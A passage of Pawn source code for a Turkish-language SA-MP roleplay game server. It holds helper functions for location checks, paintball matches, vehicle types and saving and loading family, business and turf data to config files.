		if(IsPlayerInRangeOfPoint(playerid, 3.0,1142.4733,-1326.3633,13.6259) || IsPlayerInRangeOfPoint(playerid, 5.0, 1165.1564,-1368.8240,26.6502) || IsPlayerInRangeOfPoint(playerid, 3.0,2027.0599,-1410.6870,16.9922) || IsPlayerInRangeOfPoint(playerid, 5.0, 2024.5742,-1382.7844,48.3359))
		{//ALLSAINTS, ALL SAINTS ROOF, COUNTY GENERAL, COUNTY ROOF
			return 1;
		}
	}
	return 0;
}

stock IsAtImpoundingPoint(playerid) {
	return (IsPlayerInRangeOfPoint(playerid, 4.0,1602.002197, -1608.801879, 13.662560));
}

stock IsAtArrestPoint(playerid)
{
	if(IsPlayerConnected(playerid))
	{
		if(IsPlayerInRangeOfPoint(playerid, 4.0, 1528.082397, -1677.978637, 5.890625))
		{// LSPD
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 4.0, 1564.830932, -1652.506469, 28.395606))
		{// LSPD roof
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 4.0, 304.796508, -1526.349731, 76.539062))
		{// FBI roof
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 4.0, 298.313842, -1536.036865, 24.593750))
		{// FBI
			return 1;
		}
		if(PlayerInfo[playerid][pVW] == 20002 || PlayerInfo[playerid][pVW] == 1324123)
		{//LSPD int and FBI int
			return 1;
		}
	}
	return 0;
}

stock JoinPaintballGame(playerid, game) {
	if(game == 0)
	    return 0;
	if(game > 3) {
		new
			Team1Total,
			Team2Total;

		foreach(Player, i) {
			if(GetPVarInt(i, "PBM") == game) {
				if(PaintballTeam[i] == 1) Team1Total ++;
				else if(PaintballTeam[i] == 2) Team2Total ++;
			}
		}

		if(Team1Total > Team2Total) PaintballTeam[playerid] = 2;
		else PaintballTeam[playerid] = 1;
	}

	switch(game) {
	    case 1: { // dm lv warehouse
			SetPlayerPos(playerid, 1059.895996, 2081.685791, 10.820312);
			SetPlayerInterior(playerid, 0); // just for clarity
			SetPlayerVirtualWorld(playerid, 60);

			SetPVarInt(playerid, "PBM", 1);
		}
	    case 2: { // dm random warehouse
			SetPlayerPos(playerid, 1283.287841, 5.694778, 1001.011779);
			SetPlayerInterior(playerid, 18);
			SetPlayerVirtualWorld(playerid, 61);

			SetPVarInt(playerid, "PBM", 2);
	    }
	    case 3: { // dm rc battlefield
			SetPlayerPos(playerid, -975.975708, 1060.983032, 1345.671875);
			SetPlayerInterior(playerid, 10);
			SetPlayerVirtualWorld(playerid, 62);

			SetPVarInt(playerid, "PBM", 3);
		}
	    case 4: { // tdm lv warehouse
			SetPVarInt(playerid, "PBM", 4);
			SetPlayerInterior(playerid, 0);
			SetPlayerVirtualWorld(playerid, 63);
			if(PaintballTeam[playerid] == 1) {
				SetPlayerPos(playerid, 1068.6324, 2082.7930, 10.8203);
				SetPlayerFacingAngle(playerid, 359.9999);
				SetPlayerColor(playerid, 0xFFFF0000);
				SetPlayerTeam(playerid, 1);
			} else {
				SetPlayerPos(playerid, 1069.3499, 2127.0828, 10.8203);
				SetPlayerFacingAngle(playerid, 181.4610);
				SetPlayerColor(playerid, 0x33CCFF00);
				SetPlayerTeam(playerid, 2);
			}
		}
	    case 5: { // tdm random warehouse
			SetPVarInt(playerid, "PBM", 5);
			SetPlayerInterior(playerid, 18);
			SetPlayerVirtualWorld(playerid, 64);
			if(PaintballTeam[playerid] == 1) {
				SetPlayerPos(playerid, 1305.5143, 3.6555, 1001.0269);
				SetPlayerFacingAngle(playerid, 0);
				SetPlayerColor(playerid, 0xFFFF0000);
				SetPlayerTeam(playerid, 1);
			} else {
				SetPlayerPos(playerid, 1252.7601,-46.6263,1001.0282);
				SetPlayerFacingAngle(playerid, 133.2679);
				SetPlayerColor(playerid, 0x33CCFF00);
				SetPlayerTeam(playerid, 2);
			}
	    }
	    case 6: { // tdm rc battlefield
			SetPVarInt(playerid, "PBM", 6);
			SetPlayerInterior(playerid, 10);
			SetPlayerVirtualWorld(playerid, 65);
			if(PaintballTeam[playerid] == 1) {
				SetPlayerPos(playerid, -1128.8225, 1057.4939, 1346.4141);
				SetPlayerFacingAngle(playerid, 260);
				SetPlayerColor(playerid, 0xFFFF0000);
				SetPlayerTeam(playerid, 1);
			} else {
				SetPlayerPos(playerid, -976.2924, 1061.0496, 1345.6719);
				SetPlayerFacingAngle(playerid, 90);
				SetPlayerColor(playerid, 0x33CCFF00);
				SetPlayerTeam(playerid, 2);
			}
		}
	}

	new
	    szMessage[64],
		iCount;

    format(szMessage, sizeof(szMessage), "%s paintball'a katýldý.", GetPlayerNameEx(playerid));
	foreach(Player, i) {
		if(GetPVarInt(i, "PBM") == game && GetPVarInt(i, "PBM") > 0) {
		    SendClientMessage(i, COLOR_RED, szMessage);
		    iCount++;
		}
	}
	ResetPlayerWeapons(playerid);
	SetPlayerHealth(playerid, 100);
	SetPlayerArmourEx(playerid, 0);
    if(gaPaintballGameTimer[game] <= 0 && iCount > 0 && gaPaintballGameTimeRemaining[game] > 0) {
		GivePlayerValidAdminWeapon(playerid, 24, 99999);
		GivePlayerValidAdminWeapon(playerid, 27, 99999);
		GivePlayerValidAdminWeapon(playerid, 29, 99999);
		GivePlayerValidAdminWeapon(playerid, 31, 99999);

		TogglePlayerControllable(playerid, true);

		SendClientMessage(playerid, COLOR_RED, "Oyun baþladýktan sonra katýldýnýz. Bu eli kazanamayabilirsiniz!");
    } else {
        if(iCount == 0) {
			SendClientMessage(playerid, COLOR_GREY, "Oyundaki tek oyuncu sizsiniz. Baþka oyuncu girene kadar oynayamazsýnýz.");
			SetPVarInt(playerid, "IsFrozen", 1);
			TogglePlayerControllable(playerid, false);
        } else {
			SendClientMessage(playerid, COLOR_GREY, "Oyun henüz baþlamadý, oyun baþlayana kadar kýpýrdayamazsýnýz.");
			SetPVarInt(playerid, "IsFrozen", 1);
			TogglePlayerControllable(playerid, false);

		    if(gaPaintballTimerHandles[game] == 0) {
		        gaPaintballGameTimer[game] = 5;
				gaPaintballTimerHandles[game] = SetTimerEx("PaintballTimer", 1000, true, "d", game);
			}
        }
	}

	SendClientMessage(playerid, COLOR_GREY, "Herhangi bir sebeple oyundan çýkmak isterseniz, /pbcik yazýn.");
	return 1;
}

forward PaintballTimer(game);
public PaintballTimer(game) {
    gaPaintballGameTimer[game]--;

	if(gaPaintballGameTimer[game] <= 0) {
	    foreach(Player, i) {
			if(GetPVarInt(i, "PBM") == game) {
			    GameTextForPlayer(i, "Oyun basliyor...~n~~g~SIMDI!", 2000, 3);
			    DeletePVar(i, "IsFrozen");
				TogglePlayerControllable(i, true);
				SendClientMessage(i, COLOR_RED, "GO!");

				GivePlayerValidAdminWeapon(i, 24, 99999);
				GivePlayerValidAdminWeapon(i, 27, 99999);
				GivePlayerValidAdminWeapon(i, 29, 99999);
				GivePlayerValidAdminWeapon(i, 31, 99999);
			}
		}

        gaPaintballGameTimeRemaining[game] = 5 * 60;
		KillTimer(gaPaintballTimerHandles[game]);
		gaPaintballTimerHandles[game] = 0;
	} else {
		new
	    	szMessage[32];

        format(szMessage, sizeof(szMessage), "Oyun baþlýyor...~n~~r~%d", gaPaintballGameTimer[game]);
        foreach(Player, i) {
        	if(GetPVarInt(i, "PBM") == game)
				GameTextForPlayer(i, szMessage, 1000, 3);
        }
	}
	return 1;
}

stock IsMDCPermitted(playerid)
{
	if(	PlayerInfo[playerid][pFaction] == 1|| PlayerInfo[playerid][pLeader] == 1 ||
		PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2||
		PlayerInfo[playerid][pFaction] == 5 || PlayerInfo[playerid][pLeader] == 5||
		PlayerInfo[playerid][pFaction] == 3 || PlayerInfo[playerid][pLeader] == 3)
	{
		return 1;
	}
	return 0;
}

stock IsATowTruck(carid)
{
	if(GetVehicleModel(carid) == 525) { // NB. Barney removed car id 485, 583, 574 due to native GTA bugs.
		return 1;
	}
	return 0;
}

stock IsABike(carid) {
	switch(GetVehicleModel(carid)) {
		case 509, 481, 510, 462, 448, 581, 522, 461, 521, 523, 463, 586, 468, 471: return 1;
	}
	return 0;
}

stock QSort(numbers[], left, right)
{
        new
                pivot = numbers[left],
                l_hold = left,
                r_hold = right;
        while (left < right)
        {
                while ((numbers[right] >= pivot) && (left < right)) right--;
                if (left != right)
                {
                        numbers[left] = numbers[right];
                        left++;
                }
                while ((numbers[left] <= pivot) && (left < right)) left++;
                if (left != right)
                {
                        numbers[right] = numbers[left];
                        right--;
                }
        }
        numbers[left] = pivot;
        pivot = left;
        left = l_hold;
        right = r_hold;
        if (left < pivot) QSort(numbers, left, pivot - 1);
        if (right > pivot) QSort(numbers, pivot + 1, right);
}

stock IsARC(carid)
{
	switch(GetVehicleModel(carid)) {
		case 441, 464, 465, 501, 564: return 1;
	}
	return 0;
}
stock IsABoat(carid) {
	switch(GetVehicleModel(carid)) {
		case 472, 473, 493, 484, 430, 454, 453, 452, 446: return 1;
	}
	return 0;
}

stock IsAPlane(carid)
{
	switch(GetVehicleModel(carid)) {
		case 592, 577, 511, 512, 593, 520, 553, 476, 519, 460, 513, 548, 425, 417, 487, 488, 497, 563, 447, 469: return 1;
	}
	return 0;
}

stock IsAnBus(carid)
{
	if(GetVehicleModel(carid) == 431 || GetVehicleModel(carid) == 437) {
		return 1;
	}
	return 0;
}

stock IsAnTaxi(carid)
{
	if(GetVehicleModel(carid) == 420 || GetVehicleModel(carid) == 438) {
		return 1;
	}
	return 0;
}

stock IsAnCekici(carid)
{
	if(GetVehicleModel(carid) == 525) {
		return 1;
	}
	return 0;
}

stock IsAPizzaCar(carid)
{
	if(GetVehicleModel(carid) == 448) {
		return 1;
	}
	return 0;
}

stock IsATruckerCar(carid)
{
	for(new v = 0; v < sizeof(TruckerVehicles); v++) {
	    if(carid == TruckerVehicles[v]) return 1;
	}
	return 0;
}

stock Float:GetPizzaDistance(houseid)
{
	new Float: pizzaDistance;
	pizzaDistance = GetDistance(2104.1999511719, -1787.5999755859, 13.60000038147, HouseInfo[houseid][hExteriorX], HouseInfo[houseid][hExteriorY], HouseInfo[houseid][hExteriorZ]);
    return pizzaDistance;
}

stock Float:IsABoomboxNearby(Float:posX, Float:posY, Float:posZ, playerid)
{
	new Float: boomboxDistance;
	boomboxDistance = GetDistance(posX, posY, posZ, BoomboxInfo[playerid][bbPosX], BoomboxInfo[playerid][bbPosY], BoomboxInfo[playerid][bbPosZ]);
    return boomboxDistance;
}

stock splits(const strsrc[], strdest[][], delimiter)
{
	new i, li;
	new aNum;
	new len;
	while(i <= strlen(strsrc)){
		if(strsrc[i]==delimiter || i==strlen(strsrc)){
			len = strmid(strdest[aNum], strsrc, li, i, 128);
			strdest[aNum][len] = 0;
			li = i+1;
			aNum++;
		}
		i++;
	}
	return 1;
}

stock split(const strsrc[], strdest[][], delimiter)
{
    new i, li;
    new aNum;
    new len;
    while(i <= strlen(strsrc))
    {
        if(strsrc[i] == delimiter || i == strlen(strsrc))
        {
            len = strmid(strdest[aNum], strsrc, li, i, 128);
            strdest[aNum][len] = 0;
            li = i+1;
            aNum++;
        }
        i++;
    }
    return 1;
}

stock ini_GetKey(line[])
{
	new keyRes[64];
	keyRes[0] = 0;
	if(strfind(line , "=" , true) == -1) return keyRes;
	strmid(keyRes , line , 0 , strfind(line , "=" , true) , sizeof(keyRes));
	return keyRes;
}

stock SaveBiz()
{
    if(!fexist("biz.cfg")) fcreate("biz.cfg");
	new idx = 1, File:file;
	new string[256];
	while(idx < MAX_BIZ)
	{
	    format(string, sizeof(string), "%d|%d|%s|%f|%f|%f|%d|%d|%d|%d|%d|%d|%d|%d|%d\r\n", BizInfo[idx][bType], BizInfo[idx][bStatus], BizInfo[idx][bOwner], BizInfo[idx][bX], BizInfo[idx][bY], BizInfo[idx][bZ], BizInfo[idx][bMoney], BizInfo[idx][bProducts], BizInfo[idx][bSold], BizInfo[idx][bLevel], BizInfo[idx][bPrice], BizInfo[idx][bAP]);
	    if(idx == 1)
	    {
	        file = fopen("biz.cfg", io_write);
	    }
	    else
	    {
	    	file = fopen("biz.cfg", io_append);
	    }
		fwrite(file, string);
		fclose(file);
		idx++;
	}
	print("Ýþyerleri yüklendi.");
}

stock Ini_Value(line[])
{
	new valRes[156];
	valRes[0]=0;
	if(strfind(line , "=" , true) == -1) return valRes;
	strmid(valRes , line , strfind(line , "=" , true)+1 , strlen(line) , sizeof(valRes));
	return valRes;
}

stock LoadPoints()
{
	new arrCoords[9][64];
	new strFromFile2[256];
	new File: file = fopen("points.cfg", io_read);
	if(file)
	{
		new idx;
		while (idx < sizeof(Points))
		{
			fread(file, strFromFile2);
			splits(strFromFile2, arrCoords, '|');
			Points[idx][Pointx] = floatstr(arrCoords[0]);
			Points[idx][Pointy] = floatstr(arrCoords[1]);
			Points[idx][Pointz] = floatstr(arrCoords[2]);
			Points[idx][Type] = strval(arrCoords[3]);
			Points[idx][Vulnerable] = strval(arrCoords[4]);
			strmid(Points[idx][Owner], arrCoords[5], 0, strlen(arrCoords[5]), 255);
			strmid(Points[idx][CapperName], arrCoords[6], 0, strlen(arrCoords[6]), 255);
			strmid(Points[idx][Name], arrCoords[7], 0, strlen(arrCoords[7]), 255);
			Points[idx][MatPoint] = strval(arrCoords[8]);
			//printf("%s Type:%d Owner:%s",Points[idx][Name],Points[idx][Type],Points[idx][Owner]);
			Points[idx][CaptureTimerEx2] = -1;
			Points[idx][ClaimerId] = INVALID_PLAYER_ID;
			Points[idx][PointPickupID] = CreatePickup(1239, 23, Points[idx][Pointx], Points[idx][Pointy], Points[idx][Pointz], -1);
			idx++;
		}
		fclose(file);
	}
	return 1;
}

stock UpdatePoints()
{
	new idx;
	new File: file2;
	while (idx < sizeof(Points))
	{
		new coordsstring[256];
		format(coordsstring, sizeof(coordsstring), "%f|%f|%f|%d|%d|%s|%s|%s|%d\n",
		Points[idx][Pointx],
		Points[idx][Pointy],
		Points[idx][Pointz],
		Points[idx][Type],
		Points[idx][Vulnerable],
		Points[idx][Owner],
		Points[idx][CapperName],
		Points[idx][Name],
		Points[idx][MatPoint]);
		if(idx == 0)
		{
			file2 = fopen("points.cfg", io_write);
		}
		else
		{
			file2 = fopen("points.cfg", io_append);
		}
		fwrite(file2, coordsstring);
		idx++;
		fclose(file2);
	}
	return 1;
}

stock ClearFamily(family)
{
	foreach(Player, i) {
		if(PlayerInfo[i][pGang] == family) {
			SendClientMessage(i, COLOR_LIGHTBLUE, "* Bulunduðun aile bir admin tarafýndan silindi, otomatik olarak atýldýn.");
			PlayerInfo[i][pGang] = 255;
			PlayerInfo[i][pRank] = 0;
		}
	}

	new string[MAX_PLAYER_NAME];
	format(string, sizeof(string), "Yok");
	FamilyInfo[family][FamilyTaken] = 0;
	strmid(FamilyInfo[family][FamilyName], string, 0, strlen(string), 255);
	strmid(FamilyInfo[family][FamilyMOTD], string, 0, strlen(string), 255);
	strmid(FamilyInfo[family][FamilyLeader], string, 0, strlen(string), 255);
	format(string, sizeof(string), "Rank1");
	strmid(FamilyInfo[family][FamilyRank1], string, 0, strlen(string), 255);
	format(string, sizeof(string), "Rank2");
	strmid(FamilyInfo[family][FamilyRank2], string, 0, strlen(string), 255);
	format(string, sizeof(string), "Rank3");
	strmid(FamilyInfo[family][FamilyRank3], string, 0, strlen(string), 255);
	format(string, sizeof(string), "Rank4");
	strmid(FamilyInfo[family][FamilyRank4], string, 0, strlen(string), 255);
	format(string, sizeof(string), "Rank5");
	strmid(FamilyInfo[family][FamilyRank5], string, 0, strlen(string), 255);
	format(string, sizeof(string), "Rank6");
	strmid(FamilyInfo[family][FamilyRank6], string, 0, strlen(string), 255);
	FamilyInfo[family][FamilyColor] = 0;
	FamilyInfo[family][FamilyTurfTokens] = 24;
	FamilyInfo[family][FamilyMembers] = 0;
	FamilyInfo[family][FamilySpawn][0] = 0.0;
	FamilyInfo[family][FamilySpawn][1] = 0.0;
	FamilyInfo[family][FamilySpawn][2] = 0.0;
	FamilyInfo[family][FamilySpawn][3] = 0.0;
    FamilyInfo[family][FamilyGuns][0] = 0;
    FamilyInfo[family][FamilyGuns][2] = 0;
    FamilyInfo[family][FamilyGuns][3] = 0;
    FamilyInfo[family][FamilyGuns][4] = 0;
    FamilyInfo[family][FamilyGuns][5] = 0;
    FamilyInfo[family][FamilyGuns][6] = 0;
    FamilyInfo[family][FamilyGuns][7] = 0;
	FamilyInfo[family][FamilyGuns][8] = 0;
	FamilyInfo[family][FamilyGuns][9] = 0;
	FamilyInfo[family][FamilyCash] = 0;
	FamilyInfo[family][FamilyMats] = 0;
	FamilyInfo[family][FamilyPot] = 0;
	FamilyInfo[family][FamilyCrack] = 0;
	FamilyInfo[family][FamilySafe][0] = 0.0;
	FamilyInfo[family][FamilySafe][1] = 0.0;
	FamilyInfo[family][FamilySafe][2] = 0.0;
	FamilyInfo[family][FamilyUSafe] = 0;
	for(new i = 0; i < MAX_GANG_VEHICLES; i++)
	{
	    if(FamilyVehicleInfo[family][i][fvModelId] != 0)
	    {
			FamilyVehicleInfo[family][i][fvModelId] = 0;
			FamilyVehicleInfo[family][i][fvSpawnx] = 0.0;
			FamilyVehicleInfo[family][i][fvSpawny] = 0.0;
			FamilyVehicleInfo[family][i][fvSpawnz] = 0.0;
			FamilyVehicleInfo[family][i][fvSpawna] = 0.0;
			FamilyVehicleInfo[family][i][fvSpawnatmp] = 0.0;
			FamilyVehicleInfo[family][i][fvSpawnatmp] = 0.0;
			FamilyVehicleInfo[family][i][fvSpawnatmp] = 0.0;
			FamilyVehicleInfo[family][i][fvSpawnatmp] = 0.0;
			FamilyVehicleInfo[family][i][fvLock] = 0;
			FamilyVehicleInfo[family][i][fvLocked] = 0;
			FamilyVehicleInfo[family][i][fvPaintJob] = 0;
			FamilyVehicleInfo[family][i][fvColor1] = 0;
			FamilyVehicleInfo[family][i][fvColor2] = 0;
			for(new m = 0; m < MAX_MODS; m++)
			{
			    FamilyVehicleInfo[family][i][fvMods][m] = 0;
			}
			FamilyVehicleInfo[family][i][fvPrice] = 0;
			FamilyVehicleInfo[family][i][fvImpounded] = 0;
			FamilyVehicleInfo[family][i][fvFuel] = 100.0;
			DestroyVehicle(FamilyVehicleInfo[family][i][fvId]);
			FamilyVehicleInfo[family][i][fvId] = 0;
		}
	}
	//if(IsValidDynamicPickup(FamilyInfo[family][FamilyEntrancePickup])) DestroyPickup(FamilyInfo[family][FamilyEntrancePickup]);
	//if(IsValidDynamicPickup(FamilyInfo[family][FamilyExitPickup])) DestroyPickup(FamilyInfo[family][FamilyExitPickup]);
    DestroyPickup(FamilyInfo[family][FamilyEntrancePickup]);
    DestroyPickup(FamilyInfo[family][FamilyExitPickup]);
	DestroyDynamic3DTextLabel(Text3D:FamilyInfo[family][FamilyEntranceText]);
	DestroyDynamic3DTextLabel(Text3D:FamilyInfo[family][FamilyExitText]);
	DestroyPickup(FamilyInfo[family][FamilyPickup]);
	SaveFamilies();
	return 1;
}

stock ClearCrime(playerid)
{
	if(IsPlayerConnected(playerid)) {
		new string[MAX_PLAYER_NAME];
		format(string, sizeof(string), "********");
		strmid(PlayerCrime[playerid][pBplayer], string, 0, strlen(string), 255);
		strmid(PlayerCrime[playerid][pVictim], string, 0, strlen(string), 255);
		strmid(PlayerCrime[playerid][pAccusing], string, 0, strlen(string), 255);
		strmid(PlayerCrime[playerid][pAccusedof], string, 0, strlen(string), 255);
	}
	return 1;
}

stock LoadFamilies() {

	if(!fexist("families.cfg")) return 1;

	new
		szFileStr[512],
		iIndex,
		File: iFileHandle = fopen("families.cfg", io_read);

	while (iIndex < sizeof(FamilyInfo) && fread(iFileHandle, szFileStr)) {

		sscanf(szFileStr, "p<|>is[42]s[65]s[24]iiifffiiis[20]s[20]s[20]s[20]s[20]s[20]iiiiiiiiiiiiiiiiiiiiii",
			FamilyInfo[iIndex][FamilyTaken],
			FamilyInfo[iIndex][FamilyName],
			FamilyInfo[iIndex][FamilyMOTD],
			FamilyInfo[iIndex][FamilyLeader],
			FamilyInfo[iIndex][FamilyBank],
			FamilyInfo[iIndex][FamilyCash],
			FamilyInfo[iIndex][FamilyUSafe],
			FamilyInfo[iIndex][FamilySafe][0],
			FamilyInfo[iIndex][FamilySafe][1],
			FamilyInfo[iIndex][FamilySafe][2],
			FamilyInfo[iIndex][FamilyPot],
			FamilyInfo[iIndex][FamilyCrack],
			FamilyInfo[iIndex][FamilyMats],
			FamilyInfo[iIndex][FamilyRank1],
			FamilyInfo[iIndex][FamilyRank2],
			FamilyInfo[iIndex][FamilyRank3],
			FamilyInfo[iIndex][FamilyRank4],
			FamilyInfo[iIndex][FamilyRank5],
			FamilyInfo[iIndex][FamilyRank6],
			FamilyInfo[iIndex][FamilyMembers],
			FamilyInfo[iIndex][FamilyMaxSkins],
			FamilyInfo[iIndex][FamilySkins][0],
			FamilyInfo[iIndex][FamilySkins][1],
			FamilyInfo[iIndex][FamilySkins][2],
			FamilyInfo[iIndex][FamilySkins][3],
			FamilyInfo[iIndex][FamilySkins][4],
			FamilyInfo[iIndex][FamilySkins][5],
			FamilyInfo[iIndex][FamilySkins][6],
			FamilyInfo[iIndex][FamilySkins][7],
			FamilyInfo[iIndex][FamilyColor],
			FamilyInfo[iIndex][FamilyTurfTokens],
			FamilyInfo[iIndex][FamilyGuns][0],
			FamilyInfo[iIndex][FamilyGuns][1],
			FamilyInfo[iIndex][FamilyGuns][2],
			FamilyInfo[iIndex][FamilyGuns][3],
			FamilyInfo[iIndex][FamilyGuns][4],
			FamilyInfo[iIndex][FamilyGuns][5],
			FamilyInfo[iIndex][FamilyGuns][6],
			FamilyInfo[iIndex][FamilyGuns][7],
			FamilyInfo[iIndex][FamilyGuns][8],
			FamilyInfo[iIndex][FamilyGuns][9]
		);
		++iIndex;
	}
	return fclose(iFileHandle);
}

stock SaveFamilies()
{
	new idx;
	new File: file2;
	while (idx < sizeof(FamilyInfo))
	{
		new coordsstring[512];
		format(coordsstring, sizeof(coordsstring), "%d|%s|%s|%s|%d|%d|%d|%f|%f|%f|%d|%d|%d|%s|%s|%s|%s|%s|%s|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d\n",
		FamilyInfo[idx][FamilyTaken],
		FamilyInfo[idx][FamilyName],
		FamilyInfo[idx][FamilyMOTD],
		FamilyInfo[idx][FamilyLeader],
		FamilyInfo[idx][FamilyBank],
		FamilyInfo[idx][FamilyCash],
		FamilyInfo[idx][FamilyUSafe],
		FamilyInfo[idx][FamilySafe][0],
		FamilyInfo[idx][FamilySafe][1],
		FamilyInfo[idx][FamilySafe][2],
		FamilyInfo[idx][FamilyPot],
		FamilyInfo[idx][FamilyCrack],
		FamilyInfo[idx][FamilyMats],
		FamilyInfo[idx][FamilyRank1],
		FamilyInfo[idx][FamilyRank2],
		FamilyInfo[idx][FamilyRank3],
		FamilyInfo[idx][FamilyRank4],
		FamilyInfo[idx][FamilyRank5],
		FamilyInfo[idx][FamilyRank6],
		FamilyInfo[idx][FamilyMembers],
		FamilyInfo[idx][FamilyMaxSkins],
		FamilyInfo[idx][FamilySkins][0],
		FamilyInfo[idx][FamilySkins][1],
		FamilyInfo[idx][FamilySkins][2],
		FamilyInfo[idx][FamilySkins][3],
		FamilyInfo[idx][FamilySkins][4],
		FamilyInfo[idx][FamilySkins][5],
		FamilyInfo[idx][FamilySkins][6],
		FamilyInfo[idx][FamilySkins][7],
		FamilyInfo[idx][FamilyColor],
		FamilyInfo[idx][FamilyTurfTokens],
		FamilyInfo[idx][FamilyGuns][0],
		FamilyInfo[idx][FamilyGuns][1],
		FamilyInfo[idx][FamilyGuns][2],
		FamilyInfo[idx][FamilyGuns][3],
		FamilyInfo[idx][FamilyGuns][4],
		FamilyInfo[idx][FamilyGuns][5],
		FamilyInfo[idx][FamilyGuns][6],
		FamilyInfo[idx][FamilyGuns][7],
		FamilyInfo[idx][FamilyGuns][8],
		FamilyInfo[idx][FamilyGuns][9]);
		if(idx == 0)
		{
			file2 = fopen("families.cfg", io_write);
		}
		else
		{
			file2 = fopen("families.cfg", io_append);
		}
		fwrite(file2, coordsstring);
		idx++;
		fclose(file2);
	}
	return 1;
}

stock LoadFamiliesHQ()
{
    new string2[64];
	format(string2, sizeof(string2), "familieshq.ini");
	new File: GangFile = fopen(string2, io_read);
	//printf("[DEBUG] LoadFamiliesHQ: string2 (%s)", string2);
	if(GangFile)
	{
	    //print("[DEBUG] LoadFamiliesHQ: GangFile exists, the handle parsed.");
		new key[256] , val[256];
		new Data[256];
		//print("[DEBUG] Starting while (fread(GangFile , Data , sizeof(Data)))");
		while (fread(GangFile , Data , sizeof(Data)))
		{
		    new string[128];
		    for(new f = 0; f < MAX_FAMILY; f++)
    		{
				key = ini_GetKey(Data);
				format(string, 128, "Family%dEntranceX",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyInfo[f][FamilyEntrance][0] = floatstr(val); }
				format(string, 128, "Family%dEntranceY",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyInfo[f][FamilyEntrance][1] = floatstr(val); }
				format(string, 128, "Family%dEntranceZ",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyInfo[f][FamilyEntrance][2] = floatstr(val); }
				format(string, 128, "Family%dEntranceA",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyInfo[f][FamilyEntrance][3] = floatstr(val); }
				format(string, 128, "Family%dExitX",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyInfo[f][FamilyExit][0] = floatstr(val); }
				format(string, 128, "Family%dExitY",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyInfo[f][FamilyExit][1] = floatstr(val); }
				format(string, 128, "Family%dExitZ",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyInfo[f][FamilyExit][2] = floatstr(val); }
				format(string, 128, "Family%dExitA",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyInfo[f][FamilyExit][3] = floatstr(val); }
				format(string, 128, "Family%dInterior",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyInfo[f][FamilyInterior] = strval(val); }
				format(string, 128, "Family%dCustomMap",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyInfo[f][FamilyCustomMap] = strval(val); }
				format(string, 128, "Family%dVirtualWorld",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyInfo[f][FamilyVirtualWorld] = strval(val); }
				for(new fv = 0; fv < MAX_GANG_VEHICLES; fv++)
    			{
    			    format(string, 128, "Family%dVeh%dModelId",f, fv);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyVehicleInfo[f][fv][fvModelId] = strval(val); }
					format(string, 128, "Family%dVeh%dSpawnx",f, fv);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyVehicleInfo[f][fv][fvSpawnx] = floatstr(val); }
					format(string, 128, "Family%dVeh%dSpawny",f, fv);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyVehicleInfo[f][fv][fvSpawny] = floatstr(val); }
					format(string, 128, "Family%dVeh%dSpawnz",f, fv);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyVehicleInfo[f][fv][fvSpawnz] = floatstr(val); }
					format(string, 128, "Family%dVeh%dSpawna",f, fv);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyVehicleInfo[f][fv][fvSpawna] = floatstr(val); }
					format(string, 128, "Family%dVeh%dLock",f, fv);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyVehicleInfo[f][fv][fvLock] = strval(val); }
					format(string, 128, "Family%dVeh%dLocked",f, fv);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyVehicleInfo[f][fv][fvLocked] = strval(val); }
					format(string, 128, "Family%dVeh%dPaintJob",f, fv);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyVehicleInfo[f][fv][fvPaintJob] = strval(val); }
					format(string, 128, "Family%dVeh%dColor1",f, fv);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyVehicleInfo[f][fv][fvColor1] = strval(val); }
					format(string, 128, "Family%dVeh%dColor2",f, fv);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyVehicleInfo[f][fv][fvColor2] = strval(val); }
					format(string, 128, "Family%dVeh%dFuel",f, fv);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyVehicleInfo[f][fv][fvFuel] = floatstr(val); }
    			}
    			//printf("Family %d loaded [DEBUG] FamilyEntranceX: %.1f FamilyEntranceY: %.1f FamilyEntranceZ: %.1f", f, FamilyInfo[f][FamilyEntrance][0], FamilyInfo[f][FamilyEntrance][1], FamilyInfo[f][FamilyEntrance][2]);
			}
		}
		fclose(GangFile);
	}
	return 1;
}

stock LoadObjectsForPlayer(playerid) {
	TogglePlayerControllable(playerid, 0);
	for(new o = 0; o < 6; o++)
	{
		TextDrawShowForPlayer(playerid, ObjectsLoadingTD[o]);
	}
	SetPVarInt(playerid, "LoadingObjects", 1);
	SetTimerEx("SafeLoadObjects", 3000, 0, "d", playerid);
}
stock IsVehicleOccupied(vehicleid)  {
    foreach(Player,i) {
		if(GetPlayerVehicleID(i) == vehicleid && GetPlayerVehicleSeat(i) == 0)
			return 1;
    }
	return INVALID_VEHICLE_ID;
}

stock SaveFamiliesHQ()
{
	new string3[32];
	//GetPlayerName(playerid, playername, MAX_PLAYER_NAME);
	format(string3, sizeof(string3), "familieshq.ini");
	new File: hFile = fopen(string3, io_write);
	if(hFile)
	{
		new var[32];
